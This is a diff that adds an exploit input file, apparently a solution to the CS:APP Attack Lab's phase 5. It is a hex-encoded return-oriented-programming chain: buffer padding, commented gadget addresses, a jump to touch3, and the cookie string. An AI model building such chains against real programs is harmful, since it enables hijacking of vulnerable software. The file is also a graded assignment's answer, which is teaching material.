@@ -1,0 +1,39 @@
+/* fill buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* gadget 1 address (58 to popq %rax) */
+42 16 40 00 00 00 00 00
+
+/* offset (distance from rsp to cookie) */
+20 00 00 00 00 00 00 00
+
+/* mov from eax to ecx (89 c1) */
+2a 17 40 00 00 00 00 00
+
+/* mov from ecx to edx (89 ca) */
+0e 17 40 00 00 00 00 00
+
+/* move from edx to esi (89 d6) */
+d2 16 40 00 00 00 00 00
+
+/* mov from rsp to rax (48 89 e0) */
+16 17 40 00 00 00 00 00
+
+/* mov from rax to rdi (48 89 c7) */
+27 16 40 00 00 00 00 00
+
+/* add_xy (calling this function moves rsp) */ 
+5f 16 40 00 00 00 00 00
+
+/* mov from rax to rsi */
+27 16 40 00 00 00 00 00
+
+/* touch3 address (0000000000401581) */
+81 15 40 00 00 00 00 00 
+
+/* Cookie Hex String */
+35 64 32 31 36 36 30 65 00 
